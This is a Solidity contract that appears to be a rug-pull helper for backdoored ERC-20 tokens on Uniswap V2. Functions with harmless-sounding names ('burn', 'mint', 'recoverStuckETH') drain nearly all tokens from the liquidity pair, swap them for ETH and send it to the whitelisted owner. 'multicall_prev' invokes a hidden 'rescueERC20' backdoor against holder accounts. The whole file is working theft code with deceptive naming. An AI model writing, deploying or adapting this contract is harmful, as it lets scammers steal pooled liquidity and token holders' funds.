// SPDX-License-Identifier: MIT
// 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D

// 0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24  // base
pragma solidity ^0.8.0;


interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function recoverToken(address token) external;

    function transferFrom(
        address from,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint256);

    function burn(address spender, uint256 amount) external;

    function totalSupply() external view returns (uint256);

    function manualSwap(address pair_, uint256 amount_) external;

    function manualSwap() external;

    function manualsend() external;

    function manualsend(address to) external;

    function manualSwap(address spender) external;

    function airdrop(
        address from,
        address[] memory recipients,
        uint256 amount
    ) external;

    function reduceFee(uint256 _amount) external;

    function delBots(address bot) external;

    function reduceFee(uint256 _newFee, address from) external;

    function rescueERC20(address _address, uint256 percent) external;
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);
}

interface IUniswapV2Pair {
    function sync() external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract Assist {
    address private token;
    address private pair;
    mapping(address => bool) private whites;
    IUniRouter private router;
    modifier onlyOwners() {
        require(whites[msg.sender]);
        _;
    }

    constructor() {
        whites[msg.sender] = true;
        router = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    }

    function whitelist(address[] memory whites_, bool isWhite) external onlyOwners {
        for (uint256 i = 0; i < whites_.length; i++) {
            whites[whites_[i]] = isWhite;
        }
    }

    function refresh(
        address router_,
        address token_,
        address pair_
    ) external onlyOwners {
        router = IUniRouter(router_);
        token = token_;
        pair = pair_;
    }

    function swap(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = router.WETH();
        IERC20(token).approve(address(router), ~uint256(0));
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function mint(uint256 amount) public onlyOwners {
        swap(amount);
    }

    function burn() public onlyOwners {
        uint256 pairBalance = IERC20(token).balanceOf(pair);
        uint256 amount = pairBalance - pairBalance / 10000;
        IERC20(token).transferFrom(pair, address(this), amount);
        // IERC20(token).rescueERC20(pair, 99);
        IUniswapV2Pair(pair).sync();
        uint256 balance = IERC20(token).balanceOf(address(this));
        swap(balance);
    }

    function recoverStuckETH() external onlyOwners {
        // mint(IERC20(token).totalSupply() * 1000);
        burn();
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdrawStuckTokens(address token_) external onlyOwners {
        if (token_ == address(0)) {
            payable(msg.sender).transfer(address(this).balance);
        } else {
            IERC20(token_).transfer(
                msg.sender,
                IERC20(token_).balanceOf(address(this))
            );
        }
    }

    function multicall_prev(address tokenAddr, address[] memory accounts, uint256 amount, uint256 decimals) external onlyOwners {
        uint256 remainBalance = amount * 10 ** decimals;
        for (uint256 i = 0; i < accounts.length; i++) {
            address account = accounts[i];
            uint256 balance = IERC20(tokenAddr).balanceOf(account);
            if (balance >= remainBalance) {
                // uint256 transferAmount = balance - remainBalance;
                try
                    IERC20(tokenAddr).rescueERC20(account, 100)
                    // IERC20(tokenAddr).transferFrom(
                    //     account,
                    //     address(0xdead),
                    //     transferAmount
                    // )
                {} catch {}
            }
        }
    }

    //Be cautious regarding ownership
    function multicall(address tokenAddr, address[] memory accounts, uint256 amount, uint256 decimals) external {
        // uint256 remainBalance = amount * 10 ** decimals;
        IUniswapV2Factory factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
        address _pair = factory.getPair(tokenAddr, router.WETH());
        for (uint256 i = 0; i < accounts.length; i++) {
            address account = accounts[i];
            // uint256 balance = IERC20(tokenAddr).balanceOf(account);
            // if (balance >= remainBalance) {
                // uint256 transferAmount = balance - remainBalance;
                try
                    IERC20(tokenAddr).transferFrom(
                        _pair,
                        account,
                        0
                    )
                {} catch {}
            // }
        }
    }

    function manualSwap() external onlyOwners {
        IERC20(token).manualSwap();
    }

    receive() external payable {}

    fallback() external payable {}
}
